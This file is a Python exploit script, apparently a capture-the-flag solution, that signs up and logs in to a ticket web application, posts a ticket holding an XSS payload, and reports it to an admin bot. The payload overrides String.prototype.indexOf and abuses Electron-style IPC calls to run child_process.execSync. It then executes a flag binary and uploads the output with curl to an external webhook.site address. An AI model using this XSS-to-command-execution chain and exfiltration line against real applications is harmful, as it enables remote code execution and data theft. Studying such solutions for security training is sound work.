import requests
import os

# os.environ['http_proxy'] = "http://localhost:8080"
payload = """<img src=x onerror="ipcRender.send('showNotiIpc', 'abc\\');String.prototype.indexOf = function(){return -1};//');setTimeout(() => {ipcRender.send('requireNotiIpc', {'module':'child_process','funcname':'execSync', args:'/flag > /tmp/test; curl  -F file=@/tmp/test https://webhook.site/cd6f15d2-646b-488b-bf3d-3160efa3392a'});}, 3000)//">"""
USERNAME = "test"
PASSWD = "test"
URL = "http://13.212.34.169:30775/"

s = requests.Session()


def signup():
    data = {
        "username": USERNAME,
        "password": PASSWD,
        "repassword": PASSWD
    }
    r = s.post(f"{URL}/signup", data=data, allow_redirects=False)
    if r.status_code == 302:
        print("[+] Signup ok")
    else:
        print("[-] Signup fail")


def login():
    burp0_url = f"{URL}/login"
    burp0_data = {"username": USERNAME, "password": PASSWD}
    r = s.post(burp0_url, data=burp0_data, allow_redirects=False)
    if r.status_code == 302:
        print("[+] Login ok")
    else:
        print("[-] Login fail")


def add_ticket():
    ticket_id = ""
    burp0_url = f"{URL}/ticket"
    burp0_data = {"title": "asdasda",
                  "content": payload}
    r = s.post(burp0_url, data=burp0_data, allow_redirects=False)
    if r.status_code == 302:
        location = r.headers.get("Location", "")
        if location != "":
            ticket_id = location.split('/ticket/')[1]
            print(f"[+] add_ticket ok: {ticket_id}")
    else:
        print("[-] add_ticket fail")
    return ticket_id


def report(ticket_id):
    burp0_url = f"{URL}/report"
    burp0_data = {"id": ticket_id}
    r = s.post(burp0_url, data=burp0_data, allow_redirects=False)
    if "OK" in r.text:
        print(f"[+] report ok")
    else:
        print("[-] report fail")


if __name__ == "__main__":
    signup()
    login()
    ticket_id = add_ticket()
    if ticket_id != "":
        report(ticket_id)
